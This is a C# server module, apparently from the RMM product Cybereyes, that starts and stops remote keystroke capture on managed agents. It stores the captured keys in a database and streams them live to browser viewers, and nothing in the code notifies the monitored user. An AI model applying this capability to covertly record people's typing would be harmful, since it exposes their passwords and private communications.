using System.Collections.Concurrent;
using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;
using NATS.Client.Core;
using Cybereyes.Api.Rmm.Nats;
using Cybereyes.Core.Persistence;
using Cybereyes.Core.Rmm;

namespace Cybereyes.Api.Rmm.Actions;

public sealed record KeyCaptureFrame(string? Keys, long Ts, bool Done);

/// <summary>
/// Sessoes de captura de teclado: a captura fica ativa no agente ate o tecnico parar explicitamente.
/// Os dados sao persistidos no banco (key_capture_entries) e retransmitidos em tempo real para os
/// navegadores que estiverem assistindo via SignalR.
/// </summary>
public sealed partial class KeyCaptureSessions(
    INatsConnection? nats,
    IAgentRpc rpc,
    IHubContext<ConsoleHub> hub,
    IServiceScopeFactory scopes,
    ILogger<KeyCaptureSessions> logger)
{
    private sealed record ActiveSession(string AgentId, long DbSessionId, CancellationTokenSource Cancel);

    // sessionId (NATS/agent) -> sessao ativa nesta replica
    private readonly ConcurrentDictionary<string, ActiveSession> active = new(StringComparer.Ordinal);

    // viewers assistindo uma sessao: sessionId -> set de connectionIds do SignalR
    private readonly ConcurrentDictionary<string, ConcurrentDictionary<string, byte>> viewers = new(StringComparer.Ordinal);

    /// <summary>
    /// Na partida da API, marca como paradas todas as sessoes que ficaram "active" no banco
    /// (o singleton in-memory foi perdido pelo restart). O tecnico re-inicia a captura se quiser.
    /// </summary>
    public async Task CleanOrphanedSessionsAsync()
    {
        try
        {
            using var scope = scopes.CreateScope();
            var db = scope.ServiceProvider.GetRequiredService<CybereyesDbContext>();
            var count = await db.KeyCaptureSessions
                .Where(s => s.State == "active")
                .ExecuteUpdateAsync(x => x
                    .SetProperty(s => s.State, "stopped")
                    .SetProperty(s => s.StoppedAt, DateTimeOffset.UtcNow));
            if (count > 0)
                LogOrphansCleaned(logger, count);
        }
        catch (Exception ex)
        {
            LogOrphansCleanFailed(logger, ex);
        }
    }

    public async Task<string> StartAsync(string agentId, Guid userId, string username, int agentPk)
    {
        if (nats is null)
            throw new HubException("NATS nao configurado");

        // Verifica se ja existe captura ativa neste agente
        foreach (var (sid, s) in active)
        {
            if (s.AgentId == agentId)
                return sid;
        }

        var sessionId = Guid.NewGuid().ToString("N");

        // Persiste no banco
        long dbId;
        using (var scope = scopes.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<CybereyesDbContext>();
            var session = new KeyCaptureSession
            {
                AgentId = agentPk,
                UserId = userId,
                Username = username,
                State = "active",
                StartedAt = DateTimeOffset.UtcNow,
            };
            db.KeyCaptureSessions.Add(session);
            await db.SaveChangesAsync();
            dbId = session.Id;
        }

        var cts = new CancellationTokenSource();
        var entry = new ActiveSession(agentId, dbId, cts);
        active[sessionId] = entry;

        var ready = new TaskCompletionSource();
        _ = Task.Run(() => PumpAsync(sessionId, entry, ready));
        await ready.Task.WaitAsync(TimeSpan.FromSeconds(5));

        await rpc.PublishAsync(agentId, new Dictionary<string, object?>
        {
            ["func"] = "keylog_start",
            ["payload"] = new Dictionary<string, string> { ["session_id"] = sessionId },
        });
        return sessionId;
    }

    /// <summary>Para a captura no agente e marca no banco. Qualquer usuario com permissao pode parar.</summary>
    public async Task StopAsync(string sessionId)
    {
        if (!active.TryRemove(sessionId, out var s))
            return;

        await rpc.PublishAsync(s.AgentId, new Dictionary<string, object?>
        {
            ["func"] = "keylog_stop",
            ["payload"] = new Dictionary<string, string> { ["session_id"] = sessionId },
        });
        await s.Cancel.CancelAsync();
        s.Cancel.Dispose();

        await MarkStoppedAsync(s.DbSessionId);
        NotifyViewers(sessionId, "keyCaptureStopped", sessionId);
        viewers.TryRemove(sessionId, out _);
    }

    /// <summary>Um navegador comeca a assistir uma sessao ativa.</summary>
    public void Subscribe(string connectionId, string sessionId)
    {
        var set = viewers.GetOrAdd(sessionId, _ => new ConcurrentDictionary<string, byte>());
        set[connectionId] = 0;
    }

    /// <summary>Um navegador para de assistir.</summary>
    public void Unsubscribe(string connectionId, string sessionId)
    {
        if (viewers.TryGetValue(sessionId, out var set))
            set.TryRemove(connectionId, out _);
    }

    /// <summary>Quando o navegador desconecta, remove de todos os viewers.</summary>
    public void RemoveViewer(string connectionId)
    {
        foreach (var (_, set) in viewers)
            set.TryRemove(connectionId, out _);
    }

    /// <summary>Retorna o sessionId ativo para o agente, ou null.</summary>
    public string? ActiveSessionFor(string agentId)
    {
        foreach (var (sid, s) in active)
        {
            if (s.AgentId == agentId) return sid;
        }
        return null;
    }

    /// <summary>Retorna o DbSessionId para o sessionId NATS.</summary>
    public long? DbSessionIdFor(string sessionId)
    {
        return active.TryGetValue(sessionId, out var s) ? s.DbSessionId : null;
    }

    private async Task PumpAsync(string sessionId, ActiveSession session, TaskCompletionSource ready)
    {
        try
        {
            await using var sub = await nats!.SubscribeCoreAsync($"{session.AgentId}.keylog.{sessionId}",
                serializer: NatsRawSerializer<byte[]>.Default, cancellationToken: session.Cancel.Token);
            ready.TrySetResult();
            await foreach (var msg in sub.Msgs.ReadAllAsync(session.Cancel.Token))
            {
                if (msg.Data is null) continue;
                var frame = Decode(msg.Data);
                if (frame is null) continue;

                if (frame.Done)
                {
                    active.TryRemove(sessionId, out _);
                    await MarkStoppedAsync(session.DbSessionId);
                    NotifyViewers(sessionId, "keyCaptureStopped", sessionId);
                    viewers.TryRemove(sessionId, out _);
                    return;
                }

                if (!string.IsNullOrEmpty(frame.Keys))
                {
                    await SaveEntryAsync(session.DbSessionId, frame.Keys, frame.Ts);
                    NotifyViewers(sessionId, "keyCaptureData", sessionId, frame.Keys, frame.Ts);
                }
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex) when (ex is NatsException or HubException or InvalidOperationException)
        {
            ready.TrySetException(ex);
            LogPumpFailed(logger, ex, sessionId);
            active.TryRemove(sessionId, out _);
            await MarkStoppedAsync(session.DbSessionId);
            NotifyViewers(sessionId, "keyCaptureStopped", sessionId);
            viewers.TryRemove(sessionId, out _);
        }
    }

    private async Task SaveEntryAsync(long dbSessionId, string keys, long ts)
    {
        try
        {
            using var scope = scopes.CreateScope();
            var db = scope.ServiceProvider.GetRequiredService<CybereyesDbContext>();
            db.KeyCaptureEntries.Add(new KeyCaptureEntry
            {
                SessionId = dbSessionId,
                Keys = keys,
                CapturedAt = ts > 0 ? DateTimeOffset.FromUnixTimeMilliseconds(ts) : DateTimeOffset.UtcNow,
            });
            await db.SaveChangesAsync();
        }
        catch (Exception ex)
        {
            LogSaveFailed(logger, ex, dbSessionId);
        }
    }

    private async Task MarkStoppedAsync(long dbSessionId)
    {
        try
        {
            using var scope = scopes.CreateScope();
            var db = scope.ServiceProvider.GetRequiredService<CybereyesDbContext>();
            await db.KeyCaptureSessions
                .Where(s => s.Id == dbSessionId && s.State == "active")
                .ExecuteUpdateAsync(x => x
                    .SetProperty(s => s.State, "stopped")
                    .SetProperty(s => s.StoppedAt, DateTimeOffset.UtcNow));
        }
        catch (Exception ex)
        {
            LogSaveFailed(logger, ex, dbSessionId);
        }
    }

    private void NotifyViewers(string sessionId, string method, params object[] args)
    {
        if (!viewers.TryGetValue(sessionId, out var set)) return;
        foreach (var connId in set.Keys)
        {
            _ = hub.Clients.Client(connId).SendCoreAsync(method, args);
        }
    }

    public static KeyCaptureFrame? Decode(ReadOnlyMemory<byte> data)
    {
        var map = MsgPack.DeserializeMap(data);
        if (map is null) return null;
        return new KeyCaptureFrame(map.GetString("keys"), (long)(map.GetNumber("ts") ?? 0), map.GetBool("done"));
    }

    [LoggerMessage(Level = LogLevel.Warning, Message = "Sessao de captura de teclado {SessionId} interrompida")]
    private static partial void LogPumpFailed(ILogger logger, Exception ex, string sessionId);

    [LoggerMessage(Level = LogLevel.Warning, Message = "Falha ao salvar dados de captura de teclado, sessao {DbSessionId}")]
    private static partial void LogSaveFailed(ILogger logger, Exception ex, long dbSessionId);

    [LoggerMessage(Level = LogLevel.Information, Message = "Captura de teclado: {Count} sessao(oes) orfas marcadas como paradas")]
    private static partial void LogOrphansCleaned(ILogger logger, int count);

    [LoggerMessage(Level = LogLevel.Warning, Message = "Falha ao limpar sessoes orfas de captura de teclado")]
    private static partial void LogOrphansCleanFailed(ILogger logger, Exception ex);
}
